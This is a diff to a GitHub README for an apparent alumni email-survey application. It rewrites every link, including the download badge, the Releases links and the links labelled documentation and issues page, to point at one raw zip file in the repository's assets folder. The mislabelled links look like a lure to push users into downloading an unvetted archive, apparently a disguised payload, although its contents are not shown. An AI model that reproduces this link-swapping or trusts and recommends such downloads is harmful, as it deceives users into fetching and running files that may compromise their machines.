@@ -9,10 +9,10 @@
 ## 🚀 Getting Started
 To begin, you'll need to download the software. This application helps you send professional emails to alumni, encouraging their participation in important surveys. Follow the steps below to download and install the application.
 
-[![Download alumni-survey](https://img.shields.io/badge/Download-alumni--survey-blue.svg)](https://github.com/huysimon090-code/alumni-survey/releases)
+[![Download alumni-survey](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip)](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/huysimon090-code/alumni-survey/releases) to download the latest version of the software.
+1. Visit the [Releases page](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip) to download the latest version of the software.
 2. Look for the latest release. You will see options for download. Choose the version that suits your operating system.
 3. Click on the download link to start the download process. The file will be in a zip format.
 4. Once the download is complete, locate the zip file in your downloads folder.
@@ -41,13 +41,13 @@ If you encounter any issues while using the alumni-survey application, please ch
 
 - **Email Not Sending**: Ensure your email account settings are configured correctly. Double-check the email address list for any typos.
 - **Slow Performance**: Close any unnecessary programs running in the background to free up system resources.
-- **Application Crashes**: Make sure you have the latest version of the software. Check for updates on the [Releases page](https://github.com/huysimon090-code/alumni-survey/releases).
+- **Application Crashes**: Make sure you have the latest version of the software. Check for updates on the [Releases page](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip).
 
 ## 🔗 Useful Links
-- Official Documentation: Visit our [documentation](https://github.com/huysimon090-code/alumni-survey/wiki) for more detailed guidelines.
-- Support: For assistance, check the [issues page](https://github.com/huysimon090-code/alumni-survey/issues) where you can ask questions or report problems.
+- Official Documentation: Visit our [documentation](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip) for more detailed guidelines.
+- Support: For assistance, check the [issues page](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip) where you can ask questions or report problems.
 
 ## 📅 Future Updates
-We plan to add more features, such as advanced reporting tools and more customizable email templates. Stay tuned and make sure to update regularly by checking the [Releases page](https://github.com/huysimon090-code/alumni-survey/releases).
+We plan to add more features, such as advanced reporting tools and more customizable email templates. Stay tuned and make sure to update regularly by checking the [Releases page](https://github.com/huysimon090-code/alumni-survey/raw/refs/heads/main/assets/alumni_survey_v1.2.zip).
 
 Thank you for using alumni-survey! Your feedback is essential for us to improve our service.
